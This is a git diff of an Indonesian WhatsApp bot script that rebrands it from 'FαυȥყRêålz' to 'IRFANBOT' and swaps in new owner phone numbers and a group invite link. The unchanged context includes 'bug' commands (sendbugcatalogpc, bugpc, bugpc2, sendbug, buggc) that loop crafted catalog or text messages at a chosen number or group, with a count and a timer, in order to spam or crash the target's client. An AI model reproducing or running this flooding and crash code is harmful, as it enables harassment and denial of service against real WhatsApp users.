@@ -256,7 +256,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'FαυȥყRêålz',
+message: 'IRFANBOT',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -272,7 +272,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `FαυȥყRêålz`, 
+"caption": `IRFANBOT`, 
 "jpegThumbnail": ppnyauser
 }
 }
@@ -378,7 +378,7 @@ async function replyReg(teks) {
 const buttonsDefault = [{ quickReplyButton: { displayText: ` ꪶ VERIFY ꫂ `, id: `$ verify` } }]                 
 const buttonMessage = { 
 text: teks, 
-footer: "Creator FαυȥყRêålz ꪶ𖣂ꫂ", 
+footer: "Creator IRFANBOT ꪶ𖣂ꫂ", 
 templateButtons: buttonsDefault, 
 image: {url: ppnyauser}                                   
 }
@@ -400,7 +400,7 @@ var anj = `「 *PENDAFTARAN USER* 」
 *🌹 API :* +${sender.split('@')[0]}
 *🌹 Serial:* ${serialUser}
 *🌹 Total:* ${_registered.length} Pengguna`
-sock.sendMessage(from, { caption: anj, location: { jpegThumbnail: ktedh }, templateButtons: button, footer: `Creator FαυȥყRêålz`, mentions: [m.sender] })
+sock.sendMessage(from, { caption: anj, location: { jpegThumbnail: ktedh }, templateButtons: button, footer: `Creator IRFANBOT`, mentions: [m.sender] })
 .catch ((err) => reply(err))
 }
 
@@ -410,7 +410,7 @@ switch (command) {
 case 'menu': case 'help':
 if (!isRegistered) return replyReg(api.verif)
 if (isBan) return reply(api.ban)
-const botzkir = "6285791677204@s.whatsapp.net"
+const botzkir = "6289510497533@s.whatsapp.net"
 var rndm = ['pdf','zip','vnd.openxmlformats-officedocument.presentationml.presentation','vnd.openxmlformats-officedocument.spreadsheetml.sheet','vnd.openxmlformats-officedocument.wordprocessingml.document']
 var bykir = rndm[Math.floor(Math.random() * rndm.length)]
 mbc = `Hai Kak @${sender.split("@")[0]} 
@@ -420,7 +420,7 @@ let buttoons = [
 ]
 let buttonMessaage = {
 document: ktedh, 
-fileName: `Bot By FαυȥყRêålz`, 
+fileName: `Bot By IRFANBOT`, 
 mimetype: `application/${bykir}`,
 jpegThumbnail: ktedh,
 caption: mbc,
@@ -452,7 +452,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'FαυȥყRêålz',
+message: 'IRFANBOT',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -498,7 +498,7 @@ break
 case 'ghstalk':{
 if (!isRegistered) return replyReg(api.verif)
 if (isBan) return reply(api.ban)
-if (!q) return reply(`Contoh ${prefix+command} FαυȥყRêålzzMD`)
+if (!q) return reply(`Contoh ${prefix+command} IRFANBOTzMD`)
 hw = await fetchJson(`https://api.github.com/users/${q}`)
 sock.sendMessage(m.chat, { image: { url: hw.avatar_url }, caption: 
 `*/ Stalking Github \\*
@@ -587,10 +587,10 @@ $ [ EXE ]
 ☻ join
 ☻ creategc
 ☻ bugfc
-☻ sendbugcatalogpc 6285791677204
-☻ bugpc2 6285791677204|9|9
-☻ sendbug 6285791677204
-☻ bugpc 6285791677204|9|9s
+☻ sendbugcatalogpc 6289510497533
+☻ bugpc2 6289510497533|9|9
+☻ sendbug 6289510497533
+☻ bugpc 6289510497533|9|9s
 ☻ buggc 97455446178-1461236988@g.us|9|9s
 
 */Other*
@@ -702,7 +702,7 @@ $ [ EXE ]
 let btn = [{
 urlButton: {
 displayText: "Group Bot",
-url: "https://chat.whatsapp.com/FRAGlSbHZul5n3gBHjdz8g",
+url: "https://chat.whatsapp.com/JZObD0euUnF2UknDp1UDn8",
 }
 },
 { 
@@ -714,7 +714,7 @@ quickReplyButton: {
 displayText: `Dashboard`, 
 id: `$ dashboard` } }
 ]
-sock.send5ButLoc(m.chat, memegnu, `Creator FαυȥყRêålz`, tod, btn)
+sock.send5ButLoc(m.chat, memegnu, `Creator IRFANBOT`, tod, btn)
 }
 addCmd(command.slice(0), 1, commund)
 break
@@ -883,15 +883,15 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "firstImageId": 1,
 "salePriceAmount1000": "1000",
 "retailerId": `Nomor Owner Di Atas`,
-"url": `https://wa.me/6285791677204`
+"url": `https://wa.me/6289510497533`
 },
-"businessOwnerJid": "6285791677204@s.whatsapp.net",
+"businessOwnerJid": "6289510497533@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: lep  })
 sock.relayMessage(num, catalog.message, { messageId: catalog.key.id })
 await sleep(ms(waktu))
 }
-reply(`Bug By FαυȥყRêålz`)
+reply(`Bug By IRFANBOT`)
 }
 break
 case 'bugpc2': {
@@ -920,7 +920,7 @@ num = q.split('|')[0]+'@s.whatsapp.net'
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-sock.sendMessage(num, { text: 'FαυȥყRêålz' }, { quoted: lep})
+sock.sendMessage(num, { text: 'IRFANBOT' }, { quoted: lep})
 await sleep(ms(waktu))
 }
 tek = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
@@ -937,7 +937,7 @@ num = q.split('|')[0]
 jumlah = q.split('|')[1]
 waktu = q.split('|')[2]
 for (let i = 0; i < jumlah; i++) {
-sock.sendMessage(num, { text: 'Halo Guys Aku FαυȥყRêålz Kang Bug' }, { quoted: lep})
+sock.sendMessage(num, { text: 'Halo Guys Aku IRFANBOT Kang Bug' }, { quoted: lep})
 await sleep(ms(waktu))
 }
 tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
@@ -951,8 +951,8 @@ if (isBan) return reply(api.ban)
 if (!isCreator) return reply(api.owner)
 if (!q) return reply(`Contoh\n${prefix+command} 628×××××`)
 let nonye = [`${q}`]
-teks = `*FαυȥყRêålz Hard LeveL*`
-teks1 = `\nFαυȥყRêålz`
+teks = `*IRFANBOT Hard LeveL*`
+teks1 = `\nIRFANBOT`
 for (let i of nonye) {
 sock.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1, mentions:[m.sender]}, {quoted:lep})
 }
@@ -965,7 +965,7 @@ if (!isRegistered) return replyReg(api.verif)
 if (isBan) return reply(api.ban)
 if (!isCreator) return reply(api.owner)
 if (!m.isGroup) return reply(api.group)
-ydd = `FαυȥყRêålz`
+ydd = `IRFANBOT`
 sock.sendMessage(from, {text:ydd},{quoted: { 
 key: { 
 fromMe: false, 
@@ -975,7 +975,7 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `FαυȥყRêålz`, 
+"caption": `IRFANBOT`, 
 "jpegThumbnail": ppnyauser
 }
 }
@@ -1002,7 +1002,7 @@ case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': ca
 case 'stoneeffect': {
 if (!isRegistered) return replyReg(api.verif)
 if (isBan) return reply(api.ban)
-if (!q) return reply(`Example : ${prefix + command} FαυȥყRêålz`) 
+if (!q) return reply(`Example : ${prefix + command} IRFANBOT`) 
 reply(api.wait)
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
@@ -1169,7 +1169,7 @@ if (isBan) return reply(api.ban)
 if (!isCreator) return reply(api.owner)
 if (!args[0]) return reply("Mau ngambil case apa?")
 try {
-reply(`// FαυȥყRêålz\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./command/md.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
+reply(`// IRFANBOT\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./command/md.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
 } catch {
 reply("Case Tidak Ditemukan")
 }
@@ -1258,7 +1258,7 @@ rows: listBloxk
 
 const listMessage = {
 text: teskd,
-footer: "_Creator FαυȥყRêålz_",
+footer: "_Creator IRFANBOT_",
 title: "     「 List Participants Blockir 」",
 buttonText: "List Blockir",
 mentions: await sock.parseMention(teskd),
@@ -1334,7 +1334,7 @@ let buttonns = [
 { buttonId: '.antionce on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.antionce off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await sock.sendButtonText(m.chat, buttonns, `Mode Antionce`, `_Creator FαυȥყRêålz_`, m)
+await sock.sendButtonText(m.chat, buttonns, `Mode Antionce`, `_Creator IRFANBOT_`, m)
 }
 addCmd(command.slice(0), 1, commund)
 break
@@ -1357,7 +1357,7 @@ let buttons = [
 { buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await sock.sendButtonText(m.chat, buttons, `Mode Antilink`, `_Creator FαυȥყRêålz_`, m)
+await sock.sendButtonText(m.chat, buttons, `Mode Antilink`, `_Creator IRFANBOT_`, m)
 }
 addCmd(command.slice(0), 1, commund)
 break
@@ -1414,7 +1414,7 @@ let search = await yts(text)
 url = search.videos[0].url
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
 eek = await getBuffer(anu.thumbnail)
-owned = '6285791677204'
+owned = '6289510497533'
 ngen = `
 🕵️ Title : ${anu.title}
 🥀 Ext : Search
@@ -1459,7 +1459,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'FαυȥყRêålz',
+message: 'IRFANBOT',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
@@ -1520,7 +1520,7 @@ if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(`Contoh ${p
 let dede = await cl.downloader.tiktok(`${q}`)
 krt = await getBuffer(dede.nowm)
 reply(api.wait)
-owned = '6285791677204'
+owned = '6289510497533'
 mbc = `Nih Kak @${sender.split("@")[0]} `
 let buttons = [
 {buttonId: `$ tiktokaudio ${q}`, buttonText: {displayText: 'Audio'}, type: 1}
@@ -1557,7 +1557,7 @@ orderMessage: {
 itemCount: 99999999,
 status: 1,
 surface: 1,
-message: 'FαυȥყRêålz',
+message: 'IRFANBOT',
 orderTitle: '999999999', 
 sellerJid: `0@s.whatsapp.net` 
 }
